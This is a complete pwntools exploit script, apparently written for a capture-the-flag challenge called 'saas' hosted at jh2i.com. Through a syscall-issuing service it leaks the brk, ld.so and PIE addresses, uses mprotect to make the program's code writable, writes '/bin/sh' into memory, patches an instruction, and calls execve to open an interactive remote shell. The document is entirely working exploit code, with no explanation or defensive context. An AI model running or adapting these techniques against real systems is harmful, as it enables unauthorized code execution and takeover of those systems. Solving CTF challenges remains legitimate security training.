from pwn import *
elf = ELF('./saas', checksec=False)

def set_reg(rax, rdi=0, rsi=0, rdx=0, r10=0, r9=0, r8=0, ret=True):
    p.sendlineafter(b'(decimal):', b'%d' % rax)
    p.sendlineafter(b'(decimal):', b'%d' % rdi)
    p.sendlineafter(b'(decimal):', b'%d' % rsi)
    p.sendlineafter(b'(decimal):', b'%d' % rdx)
    p.sendlineafter(b'(decimal):', b'%d' % r10)
    p.sendlineafter(b'(decimal):', b'%d' % r9)
    p.sendlineafter(b'(decimal):', b'%d' % r8)
    if ret:
        return p.recvline_contains(b'Rax:').strip().decode('latin-1').split('Rax:')[-1]

if __name__ == '__main__':
    #p = elf.process()
    p =remote('jh2i.com', 50016)
    brkaddr = eval(set_reg(12))
    log.info('leak brk address at 0x%x' % brkaddr)
    ldaddr = eval(set_reg(9, 0, 10, 0, 2 | 32)) # mmap PROT_EXEC with MAP_SHARED | MAP_ANONYMOUS
    log.info('ld.so address at 0x%x' % ldaddr)
    set_reg(1, rdi=1, rsi=ldaddr + 0x3000, rdx=8, ret=False) # leak _dl_rtld_libname to get pie address
    elf.address = u64(p.recvuntil('\x00')[1:].ljust(8, b'\x00')) - 0x2a8

    log.info('elf base address at 0x%x' % elf.address)
    set_reg(0xa, elf.address, 0x5000, 7) # set off full relro 
    set_reg(0, 0, elf.bss() + 0x100, 8, ret=False)
    p.sendline(b'/bin/sh\x00') # inset /bin/sh to bss
    set_reg(0, 0, elf.address + 0x000012cb, 2, ret=False)
    p.sendline(b'\xb8\x00') # mov eax, 0
    set_reg(0x3b, elf.bss() + 0x100, ret=False)
    p.interactive()